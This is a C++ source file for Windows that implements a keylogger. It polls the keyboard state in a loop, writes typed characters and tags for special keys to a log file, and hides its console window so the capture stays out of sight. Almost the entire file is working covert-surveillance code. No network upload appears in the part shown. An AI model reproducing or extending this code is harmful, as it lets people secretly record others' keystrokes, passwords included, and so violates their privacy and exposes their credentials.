#define _WIN32_WINNT 0x0500
#include "keylogger.h"

// Create random file name
std::string keylogger::generate_random_string(size_t length)
{
    const std::string characters = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    static std::mt19937 generator(std::random_device{}());
    std::uniform_int_distribution<size_t> distribution(0, characters.length() - 1);
    std::string random_string;
    random_string.reserve(length);
    for (size_t i = 0; i < length; ++i)
    {
        random_string += characters[distribution(generator)];
    }
    return random_string;
}

// Append string to log file
void keylogger::LOG(const string &input)
{
    std::string current_path;
    {
        std::lock_guard<std::mutex> lock(mtx);
        if (path.empty()) {
            return;
        }
        current_path = path; 
    } 
    std::ofstream logFile(current_path, std::ios::app);
    if (logFile.is_open())
    {
        logFile << input;
    }
}

// Handle special keys
bool keylogger::HandleSpecialKey(int keyCode)
{
    switch (keyCode)
    {
    case VK_SPACE:
        LOG(" ");
        return true;
    case VK_RETURN:
        LOG("\n");
        return true;
    case VK_SHIFT:
        LOG("[SHIFT]");
        return true;
    case VK_BACK:
        LOG("[BACKSPACE]");
        return true;
    case VK_RBUTTON:
        LOG("[RIGHT_CLICK]");
        return true;
    case VK_CAPITAL:
        LOG("[CAPS_LOCK]");
        return true;
    case VK_TAB:
        LOG("[TAB]");
        return true;
    case VK_UP:
        LOG("[UP_ARROW]");
        return true;
    case VK_DOWN:
        LOG("[DOWN_ARROW]");
        return true;
    case VK_LEFT:
        LOG("[LEFT_ARROW]");
        return true;
    case VK_RIGHT:
        LOG("[RIGHT_ARROW]");
        return true;
    case VK_CONTROL:
        LOG("[CTRL]");
        return true;
    case VK_MENU:
        LOG("[ALT]");
        return true;
    default:
        return false;
    }
}

// Check if key is printable ASCII
bool keylogger::IsPrintable(int key)
{
    return (key >= 32 && key <= 126);
}

void keylogger::Keylogger()
{
    // Hide console window
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    LOG("\n[Keylogger Started]\n");

    while (keyloggerON)
    {
        if (keyloggerRunning)
        {
            Sleep(10); // Avoid CPU overuse

            for (int key = 8; key <= 190; ++key)
            {
                if (GetAsyncKeyState(key) & 0x8000)
                {
                    if (!HandleSpecialKey(key))
                    {
                        if (IsPrintable(key))
                        {
                            LOG(string(1, static_cast<char>(key)));
                        }
                    }
                }
            }
        }
        else
        {
            Sleep(100);
        }
    }
}
